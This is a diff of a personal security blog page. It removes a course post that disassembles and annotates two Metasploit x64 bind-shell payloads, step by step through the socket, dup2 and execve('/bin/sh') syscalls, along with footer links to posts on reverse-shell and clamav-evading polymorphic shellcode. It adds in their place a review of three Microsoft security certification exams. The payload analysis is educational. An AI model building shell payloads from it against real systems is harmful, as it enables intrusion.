@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="author" content="Benjamin Lim">
-  <meta name="description" content="I would be analysing chunks of the linux/x64/meterpreter/bind_tcp and the linux/x64/shell_bind_tcp and see how they differ. Although both are TCP bind...">
+  <meta name="description" content="The MS-500: Microsoft 365 Security Administration, AZ-500: Microsoft Azure Security Technologies and one more exam from a list of 3, were recently...">
 
   <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
   <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
@@ -27,18 +27,18 @@
 
 <meta name="keywords" content="limbenjamin, Security">
 
-<meta property="og:title" content="SLAE64 #5 - MSF shellcode analysis">
+<meta property="og:title" content="MS-500, AZ-500, SC-200 exam review">
 <meta property="og:type" content="website">
-<meta property="og:image" content="http://limbenjamin.com/media/code.png"/>
-<meta property="og:image:secure_url" content="https://limbenjamin.com/media/code.png"/>
+<meta property="og:image" content="http://limbenjamin.com/media/azure_certs.png"/>
+<meta property="og:image:secure_url" content="https://limbenjamin.com/media/azure_certs.png"/>
 <meta property="og:site_name" content="https://limbenjamin.com">
-<meta property="og:description" content="I would be analysing chunks of the linux/x64/meterpreter/bind_tcp and the linux/x64/shell_bind_tcp and see how they differ. Although both are TCP bind shellcode, the primary difference among them is that the meterpreter shellcode is a staged payload while the other is a stageless …">
-<meta property="og:url" content="https://limbenjamin.com/articles/slae64-5-msf-shellcode-analysis.html">
+<meta property="og:description" content="The MS-500: Microsoft 365 Security Administration, AZ-500: Microsoft Azure Security Technologies and one more exam from a list of 3, were recently stipulated as part of the requirements under the skilling section for companies interested in earning the designation Microsoft Solutions partner for Security. Microsoft awards points for up to …">
+<meta property="og:url" content="https://limbenjamin.com/articles/ms500-az500-sc200-exam-review.html">
 <meta property="fb:admins" content="557193263"/>
 <meta property="fb:app_id" content="520142688161055"/>
 
 
-  <title>SLAE64 #5 - MSF shellcode analysis</title>
+  <title>MS-500, AZ-500, SC-200 exam review</title>
 
 <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
@@ -128,305 +128,21 @@
   <div class="blog-item-wrap">
     <div class="post-inner-content">
       <header class="entry-header page-header">
-        <span class="cat-item"><time datetime="2019-05-25 17:38:00+08:00">May 25, 2019</time></span>
-        <h1 class="entry-title-single-page"><a href="../articles/slae64-5-msf-shellcode-analysis.html">SLAE64 #5 - MSF shellcode analysis</a></h1>
+        <span class="cat-item"><time datetime="2022-08-12 21:13:00+08:00">Aug 12, 2022</time></span>
+        <h1 class="entry-title-single-page"><a href="../articles/ms500-az500-sc200-exam-review.html">MS-500, AZ-500, SC-200 exam review</a></h1>
       </header><!-- .entry-header -->
       <div class="entry-content">
-        <p>I would be analysing chunks of the <code>linux/x64/meterpreter/bind_tcp</code> and the <code>linux/x64/shell_bind_tcp</code> and see how they differ. Although both are TCP bind shellcode, the primary difference among them is that the meterpreter shellcode is a staged payload while the other is a stageless payload. As such, the meterpreter shellcode expects the server to provide a second stage while the other will immediately return a usable shell.</p>
-<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
-<span class="normal"> 2</span>
-<span class="normal"> 3</span>
-<span class="normal"> 4</span>
-<span class="normal"> 5</span>
-<span class="normal"> 6</span>
-<span class="normal"> 7</span>
-<span class="normal"> 8</span>
-<span class="normal"> 9</span>
-<span class="normal">10</span>
-<span class="normal">11</span>
-<span class="normal">12</span>
-<span class="normal">13</span>
-<span class="normal">14</span>
-<span class="normal">15</span>
-<span class="normal">16</span>
-<span class="normal">17</span>
-<span class="normal">18</span>
-<span class="normal">19</span>
-<span class="normal">20</span>
-<span class="normal">21</span>
-<span class="normal">22</span>
-<span class="normal">23</span>
-<span class="normal">24</span>
-<span class="normal">25</span>
-<span class="normal">26</span>
-<span class="normal">27</span>
-<span class="normal">28</span>
-<span class="normal">29</span>
-<span class="normal">30</span>
-<span class="normal">31</span>
-<span class="normal">32</span>
-<span class="normal">33</span>
-<span class="normal">34</span>
-<span class="normal">35</span>
-<span class="normal">36</span>
-<span class="normal">37</span>
-<span class="normal">38</span>
-<span class="normal">39</span>
-<span class="normal">40</span>
-<span class="normal">41</span>
-<span class="normal">42</span>
-<span class="normal">43</span>
-<span class="normal">44</span>
-<span class="normal">45</span>
-<span class="normal">46</span>
-<span class="normal">47</span>
-<span class="normal">48</span>
-<span class="normal">49</span>
-<span class="normal">50</span>
-<span class="normal">51</span>
-<span class="normal">52</span>
-<span class="normal">53</span>
-<span class="normal">54</span>
-<span class="normal">55</span>
-<span class="normal">56</span>
-<span class="normal">57</span>
-<span class="normal">58</span>
-<span class="normal">59</span>
-<span class="normal">60</span>
-<span class="normal">61</span>
-<span class="normal">62</span>
-<span class="normal">63</span>
-<span class="normal">64</span>
-<span class="normal">65</span>
-<span class="normal">66</span>
-<span class="normal">67</span>
-<span class="normal">68</span>
-<span class="normal">69</span>
-<span class="normal">70</span>
-<span class="normal">71</span>
-<span class="normal">72</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>linux/x64/meterpreter/bind_tcp payload
-
-0x400078        xor    %rdi,%rdi
-0x40007b        pushq  $0x9
-0x40007d        pop    %rax
-0x40007e        cltd
-0x40007f        mov    $0x10,%dh
-0x400081        mov    %rdx,%rsi
-0x400084        xor    %r9,%r9
-0x400087        pushq  $0x22
-0x400089        pop    %r10
-0x40008b        mov    $0x7,%dl
-0x40008d        syscall   
-
-Register values: rax - 0x9, rsi - 0x1000, r10 - 0x22, rdx - 0x1007
-sys_mmap call to allocate memory for the second stage payload
-
-
-0x40008f        test   %rax,%rax
-0x400092        js     0x4000ef
-0x400094        pushq  $0xa
-0x400096        pop    %r9
-0x400098        push   %rsi
-0x400099        push   %rax
-0x40009a        pushq  $0x29
-0x40009c        pop    %rax
-0x40009d        cltd
-0x40009e        pushq  $0x2
-0x4000a0        pop    %rdi
-0x4000a1        pushq  $0x1
-0x4000a3        pop    %rsi
-0x4000a4        syscall
-
-Register values: rax - 0x29, rcx - 0x40008f, rsi - 0x1, r10 - 0x22, rdi - 0x2, r9 - 0xa, r11 - 0x346   
-sys_socket call to create a socket to bind to
-
-
-0x4000a6        test   %rax,%rax 
-0x4000a9        js     0x4000ef
-0x4000ab        xchg   %rax,%rdi
-0x4000ad        movabs $0x100007fbb010002,%rcx
-0x4000b7        push   %rcx
-0x4000b8        mov    %rsp,%rsi
-0x4000bb        pushq  $0x10
-0x4000bd        pop    %rdx
-0x4000be        pushq  $0x2a
-0x4000c0        pop    %rax
-0x4000c1        syscall
-
-Register values: rax - 0x2a, r10 - 0x22, rdx - 0x10, rdi - 0x3, r11 - 0x306   
-sys_connect call to bind to 127.0.0.1:443
-0x100007f - 127.0.0.1
-0xbb01 - 443
-
-
-0x4000c3        test   %rax,%rax
-0x4000c6        jns    0x4000e3
-0x4000c8        dec    %r9
-0x4000cb        je     0x4000ef
-0x4000cd        pushq  $0x23
-0x4000cf        pop    %rax
-0x4000d0        pushq  $0x0
-0x4000d2        pushq  $0x5
-0x4000d4        mov    %rsp,%rdi
-0x4000d7        xor    %rsi,%rsi
-0x4000da        syscall
-
-Register values: rax - 0x0, rcx - 0x100007fbb010002, r10 - 0x22, rdx - 0x1000, r9 - 0x9, r11 - 0x306
-sys_read to read second stage payload and write to allocated memory address at rcx.
-
-I was not able to proceed further without the correct payload, however I believe the next step would be to jump to second stage 
-payload for execution.
-</code></pre></div>
-</td></tr></table>
-<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
-<span class="normal"> 2</span>
-<span class="normal"> 3</span>
-<span class="normal"> 4</span>
-<span class="normal"> 5</span>
-<span class="normal"> 6</span>
-<span class="normal"> 7</span>
-<span class="normal"> 8</span>
-<span class="normal"> 9</span>
-<span class="normal">10</span>
-<span class="normal">11</span>
-<span class="normal">12</span>
-<span class="normal">13</span>
-<span class="normal">14</span>
-<span class="normal">15</span>
-<span class="normal">16</span>
-<span class="normal">17</span>
-<span class="normal">18</span>
-<span class="normal">19</span>
-<span class="normal">20</span>
-<span class="normal">21</span>
-<span class="normal">22</span>
-<span class="normal">23</span>
-<span class="normal">24</span>
-<span class="normal">25</span>
-<span class="normal">26</span>
-<span class="normal">27</span>
-<span class="normal">28</span>
-<span class="normal">29</span>
-<span class="normal">30</span>
-<span class="normal">31</span>
-<span class="normal">32</span>
-<span class="normal">33</span>
-<span class="normal">34</span>
-<span class="normal">35</span>
-<span class="normal">36</span>
-<span class="normal">37</span>
-<span class="normal">38</span>
-<span class="normal">39</span>
-<span class="normal">40</span>
-<span class="normal">41</span>
-<span class="normal">42</span>
-<span class="normal">43</span>
-<span class="normal">44</span>
-<span class="normal">45</span>
-<span class="normal">46</span>
-<span class="normal">47</span>
-<span class="normal">48</span>
-<span class="normal">49</span>
-<span class="normal">50</span>
-<span class="normal">51</span>
-<span class="normal">52</span>
-<span class="normal">53</span>
-<span class="normal">54</span>
-<span class="normal">55</span>
-<span class="normal">56</span>
-<span class="normal">57</span>
-<span class="normal">58</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>linux/x64/shell_bind_tcp payload
-
-0x400078        pushq  $0x29
-0x40007a        pop    %rax
-0x40007b        cltd
-0x40007c        pushq  $0x2
-0x40007e        pop    %rdi
-0x40007f        pushq  $0x1
-0x400081        pop    %rsi
-0x400082        syscall
-
-Register values: rax - 0x29, rsi - 0x1
-sys_socket call to create a socket to bind to
-
-
-0x400084        xchg   %rax,%rdi
-0x400086        movabs $0x100007fbb010002,%rcx
-0x400090        push   %rcx
-0x400091        mov    %rsp,%rsi
-0x400094        pushq  $0x10
-0x400096        pop    %rdx
-0x400097        pushq  $0x2a
-0x400099        pop    %rax
-0x40009a        syscall
-
-Register values: rax - 0x2a, rcx - 0x100007fbb010002, rdx - 0x10, rdi - 0x3, r11 - 0x302 
-sys_connect call to bind to 127.0.0.1:443
-0x100007f - 127.0.0.1
-0xbb01 - 443   
-
-
-0x40009c        pushq  $0x3
-0x40009e        pop    %rsi
-0x40009f        dec    %rsi
-0x4000a2        pushq  $0x21
-0x4000a4        pop    %rax
-0x4000a5        syscall
-0x4000a7        jne    0x40009f
-
-Register values: rax - 0x21, rsi - 0x3 , 1 , 0, rdx - 0x10, rdi - 0x3, r11 - 0x302   
-sys_dup2 to redirect STDOUT, STDIN, STDERR to socket. JNE will jump 3 times, till rsi = 0x0
-
-
-0x4000a9        pushq  $0x3b
-0x4000ab        pop    %rax
-0x4000ac        cltd
-0x4000ad        movabs $0x68732f6e69622f,%rbx
-0x4000b7        push   %rbx
-0x4000b8        mov    %rsp,%rdi
-0x4000bb        push   %rdx
-0x4000bc        push   %rdi
-0x4000bd        mov    %rsp,%rsi
-0x4000c0        syscall
-
-Register values: rax - 0x3b , rbx - 0x68732f6e69622f
-
-sys_execve call to /bin/sh
-0x68732f6e69622f - /bin/sh
-</code></pre></div>
-</td></tr></table>
-<p>This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
-<p>Student ID: SLAE64-XXXXX</p>
+        <p>The MS-500: Microsoft 365 Security Administration, AZ-500: Microsoft Azure Security Technologies and one more exam from a list of 3, were recently stipulated as part of the requirements under the <a href="https://docs.microsoft.com/en-us/partner-center/solutions-partner-security">skilling section</a> for companies interested in earning the designation <code>Microsoft Solutions partner for Security</code>. Microsoft awards points for up to 6 employees in a company that hold all 3 certifications.  </p>
+<p>Coming from a security operations background, I chose to take SC-200: Microsoft Security Operations Analyst to complete the trio. That was also where I chose to start since I believed that it wouldn't pose much of a challenge. I was wrong from the get go. It was a closed book exam with trivia style questions, quite different from the open book application style questions I was more used to. Questions such as which menu item to click on to perform a specific tasks were very common. The exam also covered material which I felt were not part of the job scope of a SOC analyst. Questions on which roles or permissions are required for certain tasks or setting up the product felt more like a SOC engineer's job scope. Questions on which tier of subscription is required to enable certain features felt more like a presales engineer/onboarding specialist's responsibility. I managed to pass after a fair bit of studying from the learning paths, watching some videos and working on practice tests.  </p>
+<p>The next exam I chose to take was the AZ-500 exams. I have been working with Azure app service, MSSQL databases, key vault, logic apps and function apps in the past year and since I found out that the exam was going to be on product knowledge and not really domain knowledge, I felt more confident. Again, it wasn't as easy as expected. The main challenge I found here was that the exam covered all Azure service offerings. This included Azure AD, VM, Virtual networks, and storage which I had never used. A bit of luck played a part here, I was assigned more questions on services which I was more familiar with in my 2nd attempt and managed to score a pass.  </p>
+<p>I left MS-500 for last as I had the least familiarity with it. Fortunately, there was quite a bit of overlap in knowledge from the previous 2 exams. Monitoring of O365 services from SC-200 showed up here again. Azure AD related configuration from MS-500 also showed up here. The only new topics were Azure Information Protection, DLP and a bit of Bitlocker. I had an easier time with this exam possibily because of the overlap in material and because I was used to the style of questions.  </p>
+<p><img alt="image" src="//limbenjamin.com/media/azure_certs.png"></p>
+<p>Having passed all 3 exams in under a month, I would say that it is possible to pass the exams without much hands-on experience. Given the vast scope of products and angles covered in 3 different exams, I would say it is near impossible for anyone to have hands-on experience with everything covered on those test. I definitely have a better understanding of the various Microsoft services but I don't think I will be able to retain much of that knowledge given that I work with probably only 5% of the technologies covered in the exams.  </p>
       </div><!-- .entry-content -->
       <br /><br />
       <div class="article_meta">
         Tags:
-          <a href="../tag/security.html">Security</a>        <br />
-        <div class="similararticleline"></div>
-        <h2>Similar Articles</h2>
-          <div class="similararticlerow">
-              <blockquote class="similar_posts">
-              <a href="../articles/slae64-1-bindshell-tcp-shellcode.html"><b>SLAE64 #1 - Bindshell TCP shellcode
-              (100% Similar) - </b>
-              There are many SLAE64 blogposts each explaining their variant of shellcode out there. I thought I would join in the fun. This is my version of the Bindshell TCP shellcode. I'll keep it brief and ...</a>
-              </blockquote>
-              <blockquote class="similar_posts">
-              <a href="../articles/slae64-2-revshell-tcp-shellcode.html"><b>SLAE64 #2 - Revshell TCP shellcode
-              (100% Similar) - </b>
-              This shellcode is very similar to the Bindshell TCP shellcode, so please refer to it for the unique and interesting points. There is only 1 additional point I would like to make: Line 8/37: ...</a>
-              </blockquote>
-              <blockquote class="similar_posts">
-              <a href="../articles/slae64-6-polymorphic-shellcode.html"><b>SLAE64 #6 - Polymorphic shellcode
-              (100% Similar) - </b>
-              I have taken shellcode #603 and #859 from shell-storm and created polymorphic version that passed clamav scan. The original version of both shellcodes were detected by clamav scan due to the ...</a>
-              </blockquote>
-              <blockquote class="similar_posts">
-              <a href="../articles/slae64-3-egghunter-shellcode.html"><b>SLAE64 #3 - Egghunter shellcode
-              (100% Similar) - </b>
-              As usual, I will only be touching on interesting or unique points in the shellcode. Line 25/26: To avoid having the egg in memory, I moved 0x5090508f into a register and incremented it to get ...</a>
-              </blockquote>
-          </div>
-      </div>
+          <a href="../tag/security.html">Security</a>      </div>
       <br />
     </div>
   </div>
